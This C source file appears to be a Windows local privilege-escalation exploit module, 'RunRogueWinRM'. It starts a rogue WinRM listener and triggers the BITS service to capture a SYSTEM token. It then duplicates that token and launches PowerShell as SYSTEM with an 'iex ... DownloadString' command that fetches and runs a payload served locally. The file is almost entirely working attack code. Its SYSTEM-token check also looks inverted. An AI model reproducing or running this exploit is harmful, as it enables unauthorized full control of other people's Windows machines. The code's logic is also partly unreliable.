#include "pch.h"

#define SUCCESS_PWNED 0  // Success exit status of RunRogueWinRM
#define ERROR_NOT_ENOUGH_PRIVILEGES 1
#define ERROR_WINRM_ALREADY_PRESENT 2
#define ERROR_BITS_RUNNING 3
#define ERROR_BITS_NOT_TRIGGERED 4
#define ERROR_NO_BITS_AUTH 5
#define ERROR_UNKNOWN 6
#define ERROR_NO_POWERSHELL 7
#define ERROR_HEAP_ALLOC_FAILURE 8
#define ERROR_TOKEN_IS_NOT_SYSTEM 9
#define ERROR_NO_TOKEN_INFOS 10
#define ERROR_TOKEN_DUPLICATION_FAILURE 11
#define ERROR_OTHER 12



/**
   Main procedure called by main/dllmain. This function successively:

		- Determines where powershell executable is located
		- Checks process privileges
		- Starts a rogue WinRM server in a new thread
		- Checks if BITS is running and trigger it if it is not
		- Call a querySecurityContext to get a SYSTEM token from the Rogue WinRM
		- Duplicate this token as a primary token
		- Starts a simple http service in a new thread in charge of serving the metasploit powershell payload
		- Launch powershell as SYSTEM with a command line downloading and executing the powershell
		  payload served by the previously started http server


	@param char*	evil_powershell_script_address	Address of the powershell payload coming from lpReserved in dllmain.
	@param BOOL		debug		                    Determine if output should be printed of not.

	@return			int			                    Error code. See #define constant in this file.
 */
int RunRogueWinRM(char* evil_powershell_script_address)
{
	LocalNegotiator* negotiator = (LocalNegotiator*)calloc(1, sizeof(LocalNegotiator));
	THREAD_PARAMETERS threads_params;

	HANDLE hThread = NULL;
	HANDLE hToken = NULL;
	HANDLE elevated_token = NULL;
	HANDLE duped_token = NULL;
	PTOKEN_TYPE ptg = NULL;
	BOOL bitsRunning = TRUE;
	BOOL triggerBitsStatus = FALSE;
	BOOL result = FALSE;
	DWORD dwl = 0;
	DWORD sessionId = 0;
	wchar_t* processname = getPowershellPath();
	wchar_t command[] = L"powershell -w 1 -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1')\"";
	int error_code = ERROR_OTHER;

	PROCESS_INFORMATION	pi;
	STARTUPINFOW si;
	createProcessMethod processMethod = UNAUTHORIZED;

	// Check if powershell is present
	if (!processname)
	{
		dprintf("[RunRogueWinRM] ERROR: powershell is not present on target.");
		return ERROR_NO_POWERSHELL;
	}

	// Get a token for this process and check if current security context is vulnerable.
	if
		(
			!OpenProcessToken
			(
				GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken
			)
			)
		return 0;

	//enable privileges
	processMethod = determineProcessLaunchingMethod(hToken);
	if (processMethod == UNAUTHORIZED)
	{
		dprintf("[RunRogueWinRM] ERROR: current process has neither SE_IMPERSONATE_NAME nor SE_ASSIGNPRIMARYTOKEN_NAME privileges. Unexploitable.");
		return ERROR_HEAP_ALLOC_FAILURE;
	}

	negotiator->construct = &Init;
	negotiator->construct(negotiator);

	threads_params.negotiator = negotiator;

	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)handleListener, &threads_params, 0, NULL);
	Sleep(1000);

	do
	{
		bitsRunning = isBitsRunning();
		if (bitsRunning)
			Sleep(30000);
	} while (bitsRunning);

	triggerBitsStatus = triggerBits();
	if (!triggerBitsStatus)
	{
		dprintf("[RunRogueWinRM] ERROR: cannot activate BITS object. Exiting...");
		return ERROR_BITS_NOT_TRIGGERED;
	}
	else
	{
		dprintf("[RunRogueWinRM] BITS triggered!");
	}


	if (negotiator->authResult != -1)
	{
		dprintf("[RunRogueWinRM] authresult %d", negotiator->authResult);

		QuerySecurityContextToken(negotiator->phContext, &elevated_token);
		error_code = IsTokenSystem(elevated_token);
		if (error_code != 0)
		{
		    return error_code;
		}

		negotiator->destruct(negotiator);
		negotiator = NULL;

		GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
		if (!dwl)
		{
			dprintf("[RunRogueWinRM] ERROR: failed to get token type: error code 0x%lx", GetLastError());
		}

		error_code = DuplicateTokenEx
		(
			elevated_token,
			TOKEN_ALL_ACCESS,
			NULL,
			SecurityImpersonation,
			TokenPrimary,
			&duped_token
		);
		if (error_code == 0)
		{
			dprintf("[RunRogueWinRM] ERROR: failed to duplicate token: error code 0x%lx", GetLastError());
			return ERROR_TOKEN_DUPLICATION_FAILURE;
		}

		ZeroMemory(&si, sizeof(STARTUPINFOW));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(STARTUPINFOW);
		si.lpDesktop = (LPWSTR)L"winsta0\\default";

		sessionId = WTSGetActiveConsoleSessionId();

		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)handlePowershellDeliveryService, evil_powershell_script_address, 0, NULL);
		Sleep(1000);


		if (processMethod == WITH_TOKEN)
		{
			// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
			dprintf("[RunRogueWinRM] Launching new process through CreateProcessWithTokenW().");
			result = CreateProcessWithTokenW
			(
				duped_token,
				0,
				processname,
				command,
				0,
				NULL,
				NULL,
				&si,
				&pi
			);

			if (!result)
			{
				dprintf("[RunRogueWinRM] ERROR: CreateProcessWithTokenW failed to create proc with return code: %d", GetLastError());
				return ERROR_UNKNOWN;
			}
			else
			{
				dprintf("[RunRogueWinRM] PWNED! powershell launched as SYSTEM. Waiting for payload download.");
				WaitForSingleObject(hThread, 30000);
				CloseHandle(hThread);
				return SUCCESS_PWNED;
			}
		}
		else if (processMethod == AS_USER)
		{
			dprintf("[RunRogueWinRM] Launching process with CreateProcessAsUserW().");
			result = CreateProcessAsUserW
			(
				duped_token,
				processname,
				command,
				NULL,
				NULL,
				FALSE,
				0,
				NULL,
				L"C:\\",
				&si,
				&pi
			);

			if (!result)
			{
				dprintf("[RunRogueWinRM] ERROR: CreateProcessAsUser failed to create proc with return code: %d\n", GetLastError());
				return ERROR_UNKNOWN;;
			}
			else
			{
				dprintf("[RunRogueWinRM] PWNED! powershell launched as SYSTEM. Waiting for payload download.");
				WaitForSingleObject(hThread, 30000);
				CloseHandle(hThread);
				return SUCCESS_PWNED;
			}
		}
	}
	else { dprintf("[RunRogueWinRM] ERROR: no authenticaton received... negotiator->authResult != -1"); }

	CloseHandle(hThread);
	return ERROR_NO_BITS_AUTH;
}




/**
	This function checks the privileges of the token passed as argument in order to determine
	if powershell will be launched with CreateProcessWithTokenW (requires SE_IMPERSONATE_NAME priv)
	or with CreateProcessAsUserW (requires SE_ASSIGNPRIMARYTOKEN_NAME priv).


	@param		HANDLE hToken			A handle to a token (Trivial)

	@return		createProcessMethod		An enumeration (WITH_TOKEN, AS_USER, UNAUTHORIZED)
 */
static createProcessMethod determineProcessLaunchingMethod(HANDLE hToken)
{
	if (EnablePriv(hToken, SE_IMPERSONATE_NAME)) { return WITH_TOKEN; }
	if (EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME)) { return AS_USER; }
	return UNAUTHORIZED;
}




/**
	Find the path of the powershell executable in target.

	@return		wchar_t*		A pointer to a string containing the powershell path in the target system.
								return NULL if powershell was not found.
 */
static wchar_t* getPowershellPath()
{
	struct stat buffer;

	if (stat("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", &buffer) == 0)
	{
		return L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
	}

	if (stat("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", &buffer) == 0)
	{
		return L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
	}

	return NULL;
}



/**
	Get the token (argument) and try to enable the specified privilege (argument) for that token.


	@param		HANDLE	hToken			A handle to a token
	@param		LPCTSTR priv			A pointer to a string containing the specified privilege
										(for instance SE_IMPERSONATE_NAME)

	@return		createProcessMethod		An enumeration (WITH_TOKEN, AS_USER, UNAUTHORIZED)
 */
static BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	LUID luid;
	TOKEN_PRIVILEGES tp;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		dprintf("[EnablePriv] ERROR: Priv Lookup FALSE");
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		dprintf("[EnablePriv] ERROR: Priv Adjust FALSE");
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		dprintf("[EnablePriv] ERROR: The token does not have the specified privilege. This mean that current user doesn't have sufficient privileges for exploitation.");
		return FALSE;
	}

	return TRUE;
}




/**
	Check if the specified token is a SYSTEM token.


	@param		HANDLE	tok			A handle to a token

	@return		int					An error code. 0 for success (i.e. if tok belongs to SYSTEM)
 */
static int IsTokenSystem(HANDLE tok)
{
	DWORD Size = 0;
	DWORD UserSize = 0;
	DWORD DomainSize = 0;
	TOKEN_USER* User = NULL;
	SID* sid = NULL;
	SID_NAME_USE SidType;
	TCHAR UserName[64];
	TCHAR DomainName[64];


	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return ERROR_NO_TOKEN_INFOS;

	User = (TOKEN_USER*)calloc(1, Size);
	if (User)
	{
		GetTokenInformation(tok, TokenUser, User, Size, &Size);
		assert(Size);
		Size = GetLengthSid(User->User.Sid);
		assert(Size);
		sid = (SID*)calloc(1, Size);
		assert(sid);

		CopySid(Size, sid, User->User.Sid);
		UserSize = (sizeof UserName / sizeof * UserName) - 1;
		DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
		LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
		free(sid);
		sid = NULL;

		dprintf("%S\\%S", DomainName, UserName);
		if (!_wcsicmp(UserName, L"SYSTEM"))
			return ERROR_TOKEN_IS_NOT_SYSTEM;

		free(User);
		User = NULL;

		return 0;
	}
	else
		return ERROR_HEAP_ALLOC_FAILURE;
}




/**
	Checks if BITS is running through OpenSCManager. This is a prerequisite as
	the vulnerable behavior occurs at BITS start time. So it is mandatory to
	check if BITS is stopped in order to start it.

	@return		BOOL		FALSE if BITS is not running or if an error occurs.
 */
static BOOL isBitsRunning()
{
	SERVICE_STATUS ServiceStatus;
	SC_HANDLE hService = NULL;
	SC_HANDLE hSCManager = NULL;
	BOOL result = FALSE;
	int status = -1;


	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SERVICE_QUERY_STATUS);
	if (hSCManager == NULL)
	{
		dprintf("[isBitsRunning] SCM ERROR: Skipping BITS check... OpenSCManagerA error: %d", GetLastError());
		return FALSE;
	}

	hService = OpenServiceA(hSCManager, (LPCSTR)"BITS", SERVICE_QUERY_STATUS);
	if (hService == NULL)
	{
		dprintf("[isBitsRunning] SCM ERROR: Skipping BITS check... OpenServiceA error: %d", GetLastError());
		return FALSE;
	}

	status = QueryServiceStatus(hService, &ServiceStatus);
	if (status == 0)
	{
		dprintf("[isBitsRunning] SCM ERROR: Skipping BITS check... QueryServiceStatus error: %d", GetLastError());
		return FALSE;
	}

	if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
	{
		result = TRUE;
		dprintf("BITS is running... Waiting 30 seconds for Timeout (usually 120 seconds for timeout)...");
	}
	else
		result = FALSE;

	return result;
}




/**
	Start BITS service, and thus trigger the vulnerable behavior.
	See https://www.codeproject.com/Articles/13601/COM-in-plain-C
	for understanding how to understand how COM objects are implemented in pure C

	@return		BOOL		TRUE if BITS was successfully started. FALSE is an error occurs.
 */
static BOOL triggerBits(void)
{
	const wchar_t bits_GUID[] = L"{4991d34b-80a1-4291-83b6-3328366b9097}";
	const IID* IID_IUnknown_address = &IID_IUnknown;
	BOOL status = FALSE;
	HRESULT result = E_FAIL;
	IUnknown* unknown1 = NULL;
	CLSID clsid;

	CoInitialize(NULL);
	result = CLSIDFromString(bits_GUID, &clsid);
	result = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown_address, (void**)&unknown1);

	if (result == S_OK)
	{
		status = TRUE;
		unknown1->lpVtbl->Release(unknown1);
	}
	else
	{
		dprintf("[triggerBits] ERROR: CoCreateInstance failed with error 0x%x\n", result);
		status = FALSE;
	}

	CoUninitialize();
	return status;
}
